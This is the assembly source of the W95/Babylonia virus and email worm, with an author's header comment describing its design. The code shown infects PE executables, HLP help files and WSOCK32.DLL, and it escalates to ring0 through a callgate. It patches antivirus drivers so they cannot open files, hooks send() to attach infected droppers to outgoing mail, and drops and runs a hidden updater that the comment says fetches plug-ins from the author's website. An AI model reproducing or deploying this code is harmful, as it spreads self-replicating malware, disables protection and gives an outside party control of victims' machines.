   ; comment ^
   ;
   ; W95/Babylonia.11036 - Set babylonia on fire!
   ; (c) Vecna 1999
   ;
   ; I am of the opinion that asm talk by itself to the worthwhile reader, so, i
   ; will be brief...
   ;
   ; This virus is a memory resident ring0/ring3 virus, infecting PE EXE files,
   ; HLP files, and WSOCK32.DLL. The virus use EPO features, but no encryption or
   ; poly at all, altought it can be updated via WWW. ;)
   ;
   ; For much time, peoples where thinking about a virus upgradeable. Some attemps
   ; where made, as W95/SK, that was able to run special preparated data in RAR
   ; files. But how far the upgrade RAR packet can go? In this virus, i show my
   ; implementation of a plugin format, with the modules(plug-ins) online at a
   ; a WWW page.
   ;
   ; The virus is also a advanced email worm, attaching itself to all outgoing
   ; e-mails(no sending a new one as happy99), can deal with attachments already
   ; in e-mail body, have BASE64 and uu-encode routines, and, more important, the
   ; icon of the infected dropper sended by email change with the current date.
   ;
   ; When a infected app(or dropper) is executed, the virus dont get control at
   ; this moment. The virus patch a JMP or CALL, and wait be called. When this
   ; happen, the virus load some APIs from KERNEL32.DLL memory image(using CRC32),
   ; then jump to ring0 using a callgate. The infamous DESCRIPTOR 0 is used to
   ; store the temporary data, breaking the pmode tabu ;)
   ;
   ; While in ring0, the virus alloc some memory, and install a hook in IFS handler
   ; and wait for access to PE EXE files, HLP files, and WSOCK32.DLL. The memory
   ; is also scanned for presence of SPIDER.VXD(DrWeb) and AVP.VXD(Z0MBiE's lib).
   ; If they're found, their code is patched in a way that it lose the ability of
   ; open files. After returning control to the host, if the virus has just
   ; installed memory resident, it drop the www updater to disk and spawn it.
   ; More about the www updater below.
   ;
   ; PE files when accessed are infected by having the virus appended to last
   ; section, or overwrited if is was relocs, and with the CODE sections scanned
   ; for a suitable place for a CALL VIRUS. HLP files have added a script that pass
   ; control immediatly to virus code by using the callback features of the API of
   ; USER32 EnumWindows().
   ;
   ; When WSOCK32.DLL is accessed, the send() export is redirected to a chunk of
   ; code in top of relocation info. This code get a ring0 memory pointer to the
   ; new send() handler, by new added functionality to the GetFileAttibute() API ;)
   ;
   ; The code in new send() scan the outgoing data by e-mail info, and add a
   ; infected dropper at the end of it. The virus support both MIME and non-MIME
   ; email clients, and can add the dropper in both uu-encoded and BASE64 format.
   ; The icon of this dropper change together with the name, to reflect some dates.
   ;
   ; All data carried with the virus is compressed using aPLib v0.22b library. I
   ; change my old LZW scheme by this routines due the immense gain in speed,
   ; compressed size, and code size. Is the same algorithm i used in Fabi.9608.
   ;
   ; When the www updater is executed, it register itself, with the fake name of
   ; KERNEL32.EXE, in registry, to run always, and copy itself to /winsys directory
   ; to avoid easy detection. The updater hide himself in the CTRL+ALT+DEL task
   ; list, and stay in background waiting for the user connect to the internet.
   ;
   ; Always in background, without any user notice, the www updater then connect
   ; to my www page, download the virus plug-ins(that have a special format, and
   ; can be expanded, to have full compatibility with future versions). If these
   ; modules complain with the version and features requeried to run, it is
   ; executed. The power of this is obvious. By adding new plugins, i can make the
   ; virus a irc-worm, infect remote drives, or even a poly engine. The problem of
   ; the possible take down of my URL is bypassed with the smart use of forwarders
   ; (not implemented in the public source version of the updater).
   ;
   ; The first module online are the greetz to the peoples that helped me in this
   ; virus, be with betatesting, be with ideas, be with moral support. Currently
   ; i am working in new modules, with new ideas that i think will be worth of be
   ; coded.
   ;
   ; If you arent a d0rk, you can contact me at vecna_br@hotmail.com, but idiot
   ; questions about how compile and like will be ignored... and your soul can be
   ; lost in the attempt of contact me ;)
   ;
   ; Questions about where's the entrypoint will be ignored too... ;>
   ;
   ; ^

   .586p
   .model flat
   locals

          ofs equ offset
          by  equ byte ptr
          wo  equ word ptr
          dwo equ dword ptr
          fwo equ fword ptr

          TRUE  EQU 1
          FALSE EQU 0

   include host.inc

   _VIRUS segment dword use32 public 'KMARAI'

   vcode equ this byte

   DEBUG        equ FALSE                           ;debug version?

   DROPPER_SIZE  equ 6144

   ENTRY_READ   equ 128
   SKIP_FIRST   equ 16

   CRLF         equ <13,10>

   CRC_POLY     equ 0EDB88320h
   CRC_INIT     equ 0FFFFFFFFh

   crc    macro   string                          ;jp/lapse macro
   .radix 16d
          crcReg = CRC_INIT
          irpc _x, <string>
            ctrlByte = '&_x&' xor (crcReg and 0ff)
            crcReg = crcReg shr 8
            rept 8
              ctrlByte = (ctrlByte shr 1) xor (CRC_POLY * (ctrlByte and 1))
            endm
            crcReg = crcReg xor ctrlByte
          endm
          dd crcReg
   .radix 10d
   endm

   _gdt   struc
   limit  dw ?
   base   dd ?
   _gdt   ends

   _descriptor struc
   limit_l dw ?
   base_l  dw ?
   base_m  db ?
   access  db ?
   limit_h db ?
   base_h  db ?
   _descriptor ends

   _jmpfar struc
   jmpofs32 dd ?
   selectr  dw ?
   _jmpfar ends

   _callback struc
   offset_l dw ?
   selector dw ?
   attrib   dw ?
   offset_h dw ?
   _callback ends

   wsize2 equ 260

   hook   proc
          db 0e9h
     i_jmp dd 0                                   ;HLP redirector
   hlp_start = ofs virusmain-$
          enter 20h, 0                            ;setup stack frame
          push ecx
          push ebx
          mov ebx, [ebp+0Ch]
          cmp bl, 33                              ;hookz ifs_attr
          je @@jmpcc
          cmp bl, 36                              ;hookz ifs_open
          je @@jmpcc
          cmp bl, 37                              ;hookz ifs_ren
     @@jmpcc:
     jmpcc equ by $
          jne @@noopen                            ;beware! near form of jnz
          mov ebx, ebp
          pusha
          call delta
          mov wo [ebp+(ofs jmpcc-ofs vcode)], 0e990h
          add esp, -wsize2
          mov edi, esp
          mov eax, [ebx+10h]
          inc al
          jz @@nodrive
          sub ax, -(":@"-1)
          stosw
     @@nodrive:
          push 0                                  ;BCS_WANSI
          push 255
          mov eax, [ebx+1ch]
          mov eax, [eax+0ch]
          inc eax
          inc eax
          inc eax
          inc eax
          push eax
          push edi
          push 400041h                            ;VxDCall UniToBCSPath
          call vxd
          add esp, 16
          dec edi                                 ;edi=start of name
          dec edi
          lea esi, [edi+eax-2]
          mov eax, [esi]
          not eax

          cmp eax, not '---.'
          jne @@no_special
          cmp wo [esi-10], '_\'
          jne @@no_special                        ;trying to access the backdoor?
          cmp dwo [ebx+0ch], 33                   ;file attr?
          jne @@no_special
          mov wo [ebp+(ofs backdoor-ofs vcode)], 9090h ;wsock32.dll is calling us
     @@no_special:

        IF DEBUG EQ TRUE
          cmp [esi-4], 'TAOG'
          jne @@shit
        ENDIF
          xor eax, not 'EXE.'                     ;esi=extension
          jnz @@try_hlp

   doshdr  equ 0
   peptr   equ 3ch
   pehdr   equ doshdr+40h
   cbfr    equ pehdr+0f8h
   sectn   equ cbfr+100h
   fsize   equ sectn+200h
   epraw   equ fsize+4
   vrva    equ epraw+4
   lolimit equ vrva+4
   uplimit equ lolimit+4
   wsize4  equ uplimit+4

          add esp, -wsize4                        ;infect PE EXE files...
          mov esi, edi
          call open
          jc @@err
          call getsize
          mov [esp+fsize], eax
          cmp eax, DROPPER_SIZE                   ;my babies get better treatment
          je @@dropper
          call check_size
          jz @@err1
     @@dropper:
          mov esi, esp
          push 40h
          pop ecx
          sub edx, edx
          call read                               ;read 40h of header
          xor eax, ecx
          jnz @@err1
          movzx eax, wo [esi]
          not eax
          sub eax, not 'ZM'                       ;make sure is a EXE
          jnz @@err1

          cmp wo [esi+18h], 40h
          jb @@err1

          add cl, 0f8h-40h
          sub esi, -peptr
          lodsd
          xchg eax, edx
          call read
          jc @@err1
          call check_file                         ;already infected?
          jz @@err1

          movzx eax, wo [esi+22]
          test eax, 0102h
          jz @@err1
          test eax, 3000h                         ;executable/no dll
          jnz @@err1

          movzx ecx, wo [esi+6]
          cmp cl, 3
          jb @@err1                               ;too few sections
          push 0f8h
          imul ecx, ecx, 40
          pop edx
          add edx, [esp+peptr]
          lea esi, [esp+sectn]
          call read                               ;read section table
          sub edi, edi
          xchg edi, ecx
          mov eax, [esp+pehdr+40]
          sub eax, [esi+12]
          cmp eax, [esi+8]                        ;entrypoint in first section?
          ja @@err1
          add eax, [esi+20]                       ;raw ofs of entrycode
          mov [esp+epraw], eax

          mov eax, [esi+36]
          bts eax, 31                             ;make 1st sec +write
          jc @@err1                               ;and exit if already is
          bt eax, 5
          jnc @@err1                              ;need be CODE
          test eax, 10000000h+80h+40h
          jnz @@err1                              ;cant be SHARED or UDATA/DATA
          mov [esi+36], eax

          mov eax, [esi+12]
          mov [esp+lolimit], eax
          add eax, [esi+8]
          mov [esp+uplimit], eax                  ;boundaries of .code section
          mov ebx, -(ofs vend-ofs vcode)
          sub ecx, ebx
          mov eax, [esp+pehdr+160]
          sub eax, [esi+edi-40+12]
          jnz @@increase                          ;last section isnt relocs
          mov eax, [esi+edi-40+16]
          add eax, ebx
          jnb @@increase                          ;relocs too small
          sub eax, eax
          mov edx, eax
          add eax, [esi+edi-40+12]                ;rva of start of our code
          mov [esp+vrva], eax
          add edx, [esi+edi-40+20]
          jmp @@write
     @@increase:
          mov eax, [esi+edi-40+8]
          mov edx, eax
          add eax, [esi+edi-40+12]
          add edx, [esi+edi-40+20]
          mov [esp+vrva], eax                     ;rva of start of our code
          sub [esi+edi-40+8], ebx
          mov eax, [esi+edi-40+16]
          sub eax, ebx                            ;increase last section
          mov ebx, [esp+pehdr+60]
          dec ebx
          add eax, ebx
          not ebx
          and eax, ebx                            ;align raw section size
          mov [esi+edi-40+16], eax
     @@write:
          mov dwo [esi+edi-40+36], 0c0000040h
          sub dwo [esp+vrva], -(ofs virusmain-ofs vcode)
          add esi, edi
          add esi, (-40+8)
          lodsd
          xchg ebx, eax
          lodsd
          add ebx, eax                            ;rva+size
          mov eax, [esp+pehdr+56]
          dec eax
          add ebx, eax
          not eax
          and ebx, eax                            ;align it
          mov [esp+pehdr+80], ebx                 ;update imagesize
          mov esi, ebp
          pusha
          mov edx, [esp+epraw+((8*4))]
          push ENTRY_READ
          lea esi, [esp+cbfr+(8*4)+4]
          pop ecx
          call read                               ;read entrycode
          pusha
          push SKIP_FIRST
          pop eax
          add esi, eax                            ;skip first bytes(antiAV)
          sub ecx, eax
     @@jmp_call:
          lodsb
          cmp al, 0e8h                            ;call
          je @@found
          cmp al, 0e9h                            ;jmp
          je @@found
     @@loop1:
          loop @@jmp_call
          mov edi, [esp+(1*4)]                    ;put CALL at start
          push 5
          pop esi
          jmp @@calculate
     @@found:
          mov edi, esi
          lodsd                                   ;displacement
          mov edx, esi
          sub esi, [esp+(1*4)]                    ;turn to distance
          add eax, esi
          add eax, [esp+pehdr+40+(16*4)]          ;add entrypoint(our base)
          cmp eax, [esp+lolimit+(16*4)]
          jb @@out
          cmp eax, [esp+uplimit+(16*4)]           ;valid call?
          jb @@fine
     @@out:
          sub ecx, 4
          mov esi, edx
          jmp @@loop1
     @@fine:
          dec edi
     @@calculate:
          push esi
          mov esi, edi
          lodsb
          not eax
          mov by [ebp+(ofs instr1-ofs vcode)], al ;save modificated code
          lodsd
          not eax
          mov [ebp+(ofs instr2-ofs vcode)], eax
          pop ecx
          add ecx, [esp+pehdr+40+(16*4)]          ;add entrypoint
          mov al, 0e8h
          stosb
          mov eax, [esp+vrva+(16*4)]              ;our rva
          sub eax, ecx
          stosd                                   ;build call to it
          popa
          call write                              ;write entrycode
          popa
          call write                              ;write virus body
          sub edx, edx
          push 0f8h
          lea esi, [esp+peptr+4]
          lodsd
          pop ecx
          xchg edx, eax
          bts wo [esi+22], 0
          mov [esi+160], eax                      ;strip relocs
          mov [esi+164], eax
          call write                              ;write old header
          add edx, eax
          movzx ecx, wo [esi+6]
          imul ecx, ecx, 40
          sub esi, -(sectn-pehdr)
          call write                              ;write section table
     @@err1:
          call close
     @@err:
          add esp, wsize4

     @@try_hlp:
          xor eax, not 'PLH.' xor not 'EXE.'
          jnz @@wsockdll

   buffer    equ 0                                ;stack frame
   old_ofs   equ 4
   old_sz    equ 8
   patch1    equ 12
   wsize3    equ 16

   mainhdr   equ 0                                ;buffer structure
   pagedir   equ 10h
   syshdr    equ 210h
   build     equ 225h

          add esp, -wsize3                        ;infect HLP files...
          mov esi, edi
          call open
          jc @@error000
          push 32*1024
          push 040000dh                           ;getheap
          call vxd
          pop ecx
          mov [esp+buffer], eax
          mov esi, eax                            ;esi=buffer.mainhdr
          push 10h
          pop ecx
          sub edx, edx
          call read                               ;read 10h of header
          jc @@free
          lodsd
          xor eax, 035f3fh                        ;hlp signature?
          jnz @@free
          lodsd
          lea edx, [eax+37h]                      ;edx=directory offset
          mov ecx, 200h
          lodsd
          lodsd                                   ;esi=buffer.pagedir
          call read
          mov ecx, eax
     @@search:
          dec ecx
          jz @@free
          cmp dwo [esi+ecx], 'SYS|'
          jnz @@search
          cmp dwo [esi+ecx+4], 'MET'
          jnz @@search
          mov eax, [esi-4]                        ;eax=end of file
          xchg eax, [esi+ecx+8]                   ;section code = end of file
          xchg eax, edx
          push 15h
          push 15h
          sub esi, -(syshdr-pagedir)
          pop ecx
          call read                               ;read sys hdr
          mov ecx, [esi]
          pop eax
          sub ecx, eax
          add edx, eax
          mov [esp+old_ofs], edx
          mov [esp+old_sz], ecx                   ;save old code position/size
          mov edi, [esp.buffer]
          sub edi, -build
          lea esi, [ebp+(ofs hlp1_s-ofs vcode)]
          lea eax, [edi+(ofs _size-ofs hlp1_s)]
          mov [esp.patch1], eax
          push hlp1_sz
          pop ecx
     @@decr:
          lodsb                                    ;copy start macro
          not al
          stosb
          loop @@decr
          push edi                                ;edi=buffer
          mov dwo [ebp+(ofs i_jmp-ofs vcode)], hlp_start
          lea esi, [ebp+(ofs vend-ofs vcode)]
     @@next:
          add esi, -4
          mov eax, [esi]
          call check
          test edx, edx                           ;can make it directly?
          jnz @@ext
          mov al, 12h                             ;push ?
        org $-1
          push 12345678h
        org $-4
          stosb
          mov eax, [esi]
          stosd
          jmp @@done_
     @@ext:
          mov al, 0b8h                            ;mov eax, ?
          stosb
          mov eax, [esi]
          xor eax, edx
          stosd
          mov al, 35h                             ;xor eax, ?
          stosb
          mov eax, edx
          stosd
          mov al, 50h                             ;push eax
          stosb
     @@done_:
          cmp esi, ebp
          jne @@next
          pop eax
          mov ecx, edi
          sub ecx, eax                            ;ecx=poly code
          sub eax, eax
          mov dwo [esi+(ofs i_jmp-ofs vcode)], eax
          push ecx
          add ecx, (ofs hlp1_e-ofs p1)+(ofs hlp2_e-ofs hlp1_e)
          mov eax, [esp.patch1+4]
          mov wo [eax], cx                        ;patch macro size
          sub esi, -(ofs hlp1_e-ofs vcode)
          push hlp2_sz
          pop ecx
          rep movsb                               ;copy end macro
          pop eax
          mov esi, [esp.buffer]
          sub esi, -syshdr
          add eax, hlp2_e-hlp1_s
          add [esi], eax
          add [esi+4], eax                        ;fix syshdr size
          mov esi, edi
          mov edx, [esp.old_ofs]
          mov ecx, [esp.old_sz]
          sub eax, ecx                            ;old script too large?
          jbe @@free
          call read                               ;read old code
          cmp [esi+4], "`(RR"
          je @@free                               ;probably already infected
          mov ebp, [esp.buffer]                   ;ebp=buffer
          lea ecx, [edi+eax]
          sub ecx, ebp                            ;ecx=our size
          add ecx, -syshdr
          mov edx, [ebp.mainhdr+12]
          lea esi, [ebp.syshdr]
          call write                              ;write our code
          mov esi, [esp.buffer]
          push 10h
          add [esi.mainhdr+12], eax
          sub edx, edx
          pop ecx
          call write                              ;write main header
          mov edx, [esi.mainhdr+4]
          sub edx, -37h
          mov ecx, 200h
          add esi, pagedir
          call write                              ;write directory
     @@free:
          push dwo [esp+buffer]
          push 040000eh                           ;freeheap
          call vxd
          pop eax
          call close                              ;close file
     @@error000:
          add esp, wsize3

     @@wsockdll:
   ;       xor eax, not 'EXE.' xor not 'PLH.' xor not 'LLD.'
          xor eax, 01c000c00h
          jnz @@shit
        IF DEBUG EQ FALSE
          mov eax, [esi-4]
          mov esi, [esi-8]
          not eax
          xchg eax, esi
          not eax
          cmp esi, not '23KC'
          jne @@shit
          cmp eax, not 'OSW\'
          jne @@shit
        ENDIF

   obufer   equ 0                                 ;stack frame
   header   equ obufer+3ch
   pe_hdr   equ header+4
   section  equ pe_hdr+0f8h
   export   equ section+200h
   vofs     equ export+4
   vraw     equ vofs+4
   etable   equ vraw+4
   wsize1   equ etable+(4*20)

          add esp, -wsize1                        ;patch WSOCK32.DLL...
          mov esi, edi
          call open
          jc @@error0
          call getsize
          mov edi, eax
          call check_size
          jz @@error1
          sub edx, edx
          mov ecx, 40h
          lea esi, [esp+obufer]
          call read
          cmp wo [esp+obufer], 'ZM'
          jne @@error1
          push 0f8h
          pop ecx
          mov edx, [esp+header]
          cmp edx, edi
          jae @@error1                            ;point outside of the file?
          lea esi, [esp+pe_hdr]
          call read
          jc @@error1
          call check_file
          jz @@error1
          call write                              ;write pe header
          add edx, eax
          movzx ecx, wo [esi+6]
          push ecx
          imul ecx, ecx, 40
          lea esi, [esp+section+4]
          call read                               ;read section table
          pop ecx
     @@writeable:
          bts dwo [esi+36], 31                    ;make all sections writeable
          sub esi, -40
          loop @@writeable
          mov [esi-40+36], 0c0000040h
          mov ecx, [esi-40+8]                     ;increase last section
          push ecx
          add ecx, [esi-40+20]
          mov [esp+vraw+4], ecx                   ;raw of our patch
          pop ecx
          add ecx, [esi-40+12]
          mov [esp+vofs], ecx                     ;rva of our patch
          add dwo [esi-40+8], (ofs pend-ofs pstart)
          mov ebx, [esi-40+8]
          cmp ebx, [esi-40+16]
          jbe @@fit
          mov ecx, [esp+pe_hdr+60]
          dec ecx
          add ebx, ecx
          not ecx
          and ebx, ecx
          mov [esi-40+16], ebx                    ;align
     @@fit:
          xchg eax, ecx
          lea esi, [esp+section]
          call write
          mov eax, [esp+pe_hdr+120]               ;eax=export table
          call rva2raw
          xchg eax, edx
          push 4
          pop ecx
          sub edx, -28
          lea esi, [esp+export]
          call read                               ;read export table addresses
          mov eax, [esi]
          call rva2raw
          xchg eax, edx
          push (4*20)
          pop ecx
          lea esi, [esp+etable]                   ;read 20 exports
          call read
          mov eax, [esp+vofs]
          mov edi, [esp+pe_hdr+52]                ;wsock32 base
          sub eax, -(ofs send-ofs pstart)
          xchg [esi+(4*18)], eax                  ;hook send
          add edi, eax
          mov [ebp+(ofs oldsend-ofs vcode)], edi
          mov [ebp+(ofs _send-ofs vcode)], edi
          call write
          mov edx, [esp+vraw]
          push (ofs pend-ofs pstart)
          pop ecx
          call delta
          sub ebp, -(ofs pstart-ofs vcode)
          xchg esi, ebp
          call write                              ;write our patch
     @@error1:
          call close
     @@error0:
          add esp, wsize1

     @@shit:
          add esp, wsize2                         ;release tmp buffer
          mov wo [ebp+(ofs jmpcc-ofs vcode)], 0850fh
          popa

     @@noopen:
          push 6
          push 1Ch
          pop ebx
          pop ecx                                 ;total=6 paramz
     @@nparam:
          mov eax, [ebp+ebx]                      ;copy paramz from old frame
          push eax                                ;to new frame
          add ebx, -4
          loop @@nparam
          db 0b8h                                 ;mov eax, ?
     oldhook dd 0
          call [eax]                              ;call old hookz
          add esp, 6*4

     backdoor equ $
          jmp @@closed
          call @@delta
     @@delta:
          pop ecx
          add ecx, (ofs my_send-ofs @@delta)
          mov wo [ecx-(ofs my_send-ofs backdoor)], ((ofs @@closed-(ofs backdoor+2))*100h)+0ebh
          mov ebx, [ebp+1ch]                      ;ioreq
          push esi
          mov esi, [ebx+14h]
          lodsd                                    ;c:\_
          sub eax, eax
          mov ebx, eax
     @@byte:
          lodsb                                   ;get filename char
          inc ah
          sub al, 'A'
          or bl, al                               ;build address
          cmp ah, 8
          je @@doneb
          shl ebx, 4
          jmp @@byte
     @@doneb:
          mov [ebx], ecx                          ;patch requested address
          pop esi
     @@closed:

          pop ebx
          pop ecx
          leave
          ret
   hook   endp


   delta  proc
          call @@delta
     @@delta:
          pop ebp
          add ebp, -(ofs @@delta-ofs vcode)
          ret
   delta  endp


   check_file proc
          mov eax, [esi]
          not eax
          cmp eax, not 'EP'
          jne @@error
          cmp wo [esi+4], 14ch                    ;386
          jb @@error
          cmp wo [esi+4], 14eh                    ;586
          ja @@error
          xor eax, edx                            ;(not('PE')xor(pe_ofs)xor(entry))
          bswap eax
          xor eax, [esi+40]
          cmp [esi+8], eax                        ;infected?
          mov [esi+8], eax
          db 066h, 0b8h                           ;mov ax, ?
     @@error:
          sub eax, eax
          ret
   check_file endp


   gdt      equ 0
   idt      equ 6
   ring0_cs equ 12
   ring0_ds equ 16
   jmpfar   equ 20
   wsize    equ 26

   kernel32 equ 0bff70000h

   virusmain proc
          pushf
          pusha
          add esp, -wsize
          cld
          sub eax, eax
          call @@seh
          mov esp, [esp+8]                        ;hmm... SEH... :/
          jmp @@installed
     @@seh:
          push dwo fs:[eax]
          mov fs:[eax], esp
          mov esi, [kernel32+80h+120]             ;get kernel32 APIs...
          mov esi, [esi]
          sub esi, -(kernel32+24)                 ;esi=export directory+24
          lodsd
          push eax
          lodsd
          push eax
          lodsd
          xchg ebx, eax
          pop ebp                                  ;ebp=RVA table
          pop ecx                                  ;ecx=number of names
          lodsd
          xchg esi, eax                            ;esi=names table
          xchg esi, ebx                            ;ebx=ordinal table
          mov edx, -kernel32
          sub esi, edx
          sub ebp, edx
          sub ebx, edx                            ;edx=-kernel32
          sub edi, edi
     @@loopy:
          inc edi                                 ;edi=ordinal counter
          lodsd                                   ;eax=API name string
          pusha
          sub eax, edx
          xchg eax, esi
          push CRC_INIT                           ;calculate crc of string
          pop ecx
     @@next_byte:
          lodsb
          test al, al
          jz @@done
          xor cl, al
          mov al, 8
     @@next_bit:
          shr ecx, 1
          jnc @@poly
          xor ecx, CRC_POLY
     @@poly:
          dec al
          jnz @@next_bit
          jmp @@next_byte
     @@done:
          call @@delta1
     @@delta1:
          pop esi
          add esi, (ofs _openfile-ofs @@delta1)
          cmp ecx, 12345678h                      ;crcz of API
        org $-4
          crc <CreateFileA>
          je @@patch_api
          sub esi, -((ofs _getfattr-ofs vcode)-(ofs _openfile-ofs vcode))
          cmp ecx, 12345678h
        org $-4
          crc <GetFileAttributesA>
          je @@patch_api
          sub esi, -((ofs _writefile-ofs vcode)-(ofs _getfattr-ofs vcode))
          cmp ecx, 12345678h
        org $-4
          crc <WriteFile>
          je @@patch_api
          add esi, ((ofs _closehandle-ofs vcode)-(ofs _writefile-ofs vcode))
          cmp ecx, 12345678h
        org $-4
          crc <CloseHandle>
          je @@patch_api
          sub esi, -((ofs _seekfile-ofs vcode)-(ofs _closehandle-ofs vcode))
          cmp ecx, 12345678h
        org $-4
          crc <SetFilePointer>
          je @@patch_api
          add esi, (ofs _loadl-ofs vcode)-(ofs _seekfile-ofs vcode)
          cmp ecx, 12345678h
        org $-4
          crc <LoadLibraryA>
          je @@patch_api
          add esi, (ofs _freel-ofs vcode)-(ofs _loadl-ofs vcode)
          cmp ecx, 12345678h
        org $-4
          crc <FreeLibrary>
          je @@patch_api
          sub esi, -((ofs _getproc-ofs vcode)-(ofs _freel-ofs vcode))
          cmp ecx, 12345678h
        org $-4
          crc <GetProcAddress>
          je @@patch_api
          add esi, (ofs _gsystime-ofs vcode)-(ofs _getproc-ofs vcode)
          cmp ecx, 12345678h
        org $-4
          crc <GetSystemTime>
          je @@patch_api
          sub esi, -((ofs _fdelete-ofs vcode)-(ofs _gsystime-ofs vcode))
          cmp ecx, 12345678h
        org $-4
          crc <DeleteFileA>
          je @@patch_api
          add esi, (ofs _readfile-ofs vcode)-(ofs _fdelete-ofs vcode)
          cmp ecx, 12345678h
        org $-4
          crc <ReadFile>
          je @@patch_api
          add esi, (ofs _getmhandle-ofs vcode)-(ofs _readfile-ofs vcode)
          cmp ecx, 12345678h
        org $-4
          crc <GetModuleHandleA>
          je @@patch_api
          sub esi, -((ofs _winexec-ofs vcode)-(ofs _getmhandle-ofs vcode))
          cmp ecx, 12345678h
        org $-4
          crc <WinExec>
          jne  @@end_loopy

     @@patch_api:
          movzx eax, wo [ebx+(edi*2)]             ;get ordinal
          dec eax
          mov eax, [ebp+(eax*4)]                  ;get rva
          sub eax, edx
          mov [esi], eax                          ;got it!
     @@end_loopy:
          popa
          dec ecx
          jnz @@loopy                            ;all APIs scanned

          call delta
          lea eax, [ebp+(ofs wsock-ofs vcode)]
          push eax
          db 0b8h
     _loadl dd 0
          call eax                                ;load wsock32.dll
          xchg eax, ecx
          jecxz @@suxx
          push ecx                                ;for FreeLibrary
          call @@send
          db 'send', 0
     @@send:
          push ecx
          db 0b8h+7                               ;GetProcAddress
     _getproc dd 0
          call edi
          cmp by [eax], 0e8h                      ;the difference between masters
          jne @@isnt                              ;and pupils ;)
          cmp by [eax+5], 0b8h
          jne @@isnt
          mov eax, [eax+6]                        ;get real addy :)
     @@isnt:
          mov [ebp+(ofs oldsend-ofs vcode)], eax
          db 0b8h
     _freel dd 0
          call eax
     @@suxx:

          push 8
          push ebp
          pop esi
          push (ofs vend-ofs vcode)/4             ;make sure we're commited
          pop ecx
          rep lodsd
          pop eax
          lea edi, [ebp+(ofs myname-ofs vcode)]
          xchg eax, ecx
          rep stosd

          mov ebp, esp                            ;jmp2ring0...
          push 1
          sgdt [ebp+gdt]                          ;get global descriptor table
          sidt [ebp+idt]                          ;get interrupt table
          mov esi, [ebp+gdt.base]
          mov edi, esi
          movzx ecx, wo [ebp+gdt.limit]
          pop ebx
     @@search_gdt:
          sub eax, eax
          cmp wo [esi.limit_l], 0ffffh
          jne @@next_descriptor
          cmp by [esi.limit_h], 0cfh              ;descriptor start at 0?
          jne @@next_descriptor
          cmp wo [esi.base_l], ax                 ;and cover the whole range?
          jne @@next_descriptor
          cmp by [esi.base_m], al
          jne @@next_descriptor
          cmp by [esi.base_h], al
          jne @@next_descriptor                   ;is a flat descriptor!
          cmp [esi.access], 9bh
          jne @@no_code                           ;is a code descriptor?
          mov eax, esi
          sub eax, [ebp+gdt.base]
          mov [ebp+ring0_cs], eax                 ;yes, save it!
          shl ebx, 1
          jmp @@next_descriptor
     @@no_code:
          cmp [esi.access], 93h
          jne @@next_descriptor                   ;is a data descriptor?
          mov eax, esi
          sub eax, [ebp+gdt.base]
          mov [ebp+ring0_ds], eax                 ;yes, save it!
          shl ebx, 1
     @@next_descriptor:
          lodsd
          lodsd
          bt ebx, 2                               ;our 2 descriptors found?
          jc @@search_done
          loop @@search_gdt
          jmp @@installed                         ;flat descriptors dont found
     @@search_done:
          mov esi, edi                            ;esi=1st entry
          lodsd                                   ;edi=nul entry
          lodsd
          test eax, eax                           ;nul entry isnt empty?
          jnz @@installed                         ;then already resident
          pusha
          movsd
          movsd                                   ;backup 1st descriptor
          popa
          mov eax, dwo [ebp+ring0_cs]
          mov wo [esi.selector], ax               ;ring0 code selector
          mov wo [esi.attrib], 0ec00h
          call @@over_ring0_code                  ;[esp]=ring0 code

     @@ring0_code:
          mov ds, ax
          mov es, ax                              ;setup data access
          xchg esi, edi
          movsd                                   ;restore 1st descriptor
          movsd

          mov edi, ebp
          mov ebx, [edi.gdt.base]
          movzx ecx, wo [edi.gdt.limit]
          call protect                             ;make gdt read only
          mov ebx, [edi.idt.base]
          movzx ecx, wo [edi.idt.limit]
          call protect                             ;make idt read only

          push 00270005h
          call vxd                                ;VXDLDR GetDeviceList
     @@next:
          mov ebx, [eax+5]                        ;VxD_Desc_Block *DI_DDB
          sub ebx, 0C0000000h
          jc @@next_vxd
          lea ecx, [ebx+0C000000Ch]               ;Name_0
          cmp [ecx], 'DIPS'                       ;'SPIDER  '
          je @@patch
          cmp [ecx], '9PVA'                       ;'AVP95   '
          jne @@next_vxd
     @@patch:
          push 0000D500h                          ;R0_OPENCREATFILE
          pop esi
          call ScanVxd
          inc esi                                 ;R0_OPENCREAT_IN_CONTEXT
          call ScanVxd
     @@next_vxd:
          mov eax, [eax]
          or eax, eax
          jnz @@next

          push 9
          push eax
          push eax
          push eax
          push eax
          push eax
          push 1
          push 64/4                               ;memory for email shitz
          push 010053h
          call vxd
          add esp, 8*4
          test eax, eax
          jz @@fucked
          mov [ebp+(ofs mem_temp-ofs vcode)], eax
     @@fucked:
          push (ofs vend-ofs vcode)
          push 9
          push eax
          push eax
          push eax
          push eax
          push eax
          push 1
          push (((ofs vend-ofs vcode)+4095)/4096)
          push 010053h                            ;PageAlloc
          call vxd
          add esp, 8*4
          test eax, eax
          jz @@fuck
          mov edi, eax
          xchg eax, ecx
          xchg ecx, [esp]                         ;pop size/push &hook
          push ebp
          pop esi
          rep movsb
          mov [edi+(ofs i_jmp-ofs vcode)-(ofs vend-ofs vcode)], ecx
          mov [edi+(ofs socket_out-ofs vcode)-(ofs vend-ofs vcode)], ecx
          mov wo [edi+(ofs jmpcc-ofs vcode)-(ofs vend-ofs vcode)], 0850fh
          push 00400067h                          ;install ifs hook
          call vxd
          mov [edi+(ofs oldhook-ofs vcode)-(ofs vend-ofs vcode)], eax
     @@fuck:
          pop eax
          retf

     @@over_ring0_code:
          pop eax
          mov ebx, eax
          shr eax, 16
          mov wo [esi.offset_l], bx               ;address of routine
          mov wo [esi.offset_h], ax
          push 0
          pop dwo [ebp+jmpfar.jmpofs32]
          mov wo [ebp+jmpfar.selectr], 8          ;jmp to callback 1
          mov eax, dwo [ebp+ring0_ds]             ;set ring0 data
          push ds
          push es
          cli
          call fwo [ebp+jmpfar]                   ;call our ring0 code
          cli
          pop es
          pop ds
     @@installed:
          sub eax, eax
          pop dwo fs:[eax]                            ;remove SEH
          pop ecx

          call delta
          mov eax, [ebp+(ofs mem_temp-ofs vcode)]
          test eax, eax
          jz @@no_ready

          push eax
          call @@over

   include updater.inc

     @@over:
          call _aP_depack_asm                     ;unpack updater data
          push eax
          push 2
          pop ecx
          lea esi, [ebp+(ofs dropname-ofs vcode)]
          call r3_open
          pop ecx
          jz @@no_ready
          mov esi, [ebp+(ofs mem_temp-ofs vcode)]
          call r3_write
          call r3_close

          push 0
          lea eax, [ebp+(ofs dropname-ofs vcode)]
          push eax
          db 0b8h
     _winexec dd 0
          call eax

     @@no_ready:

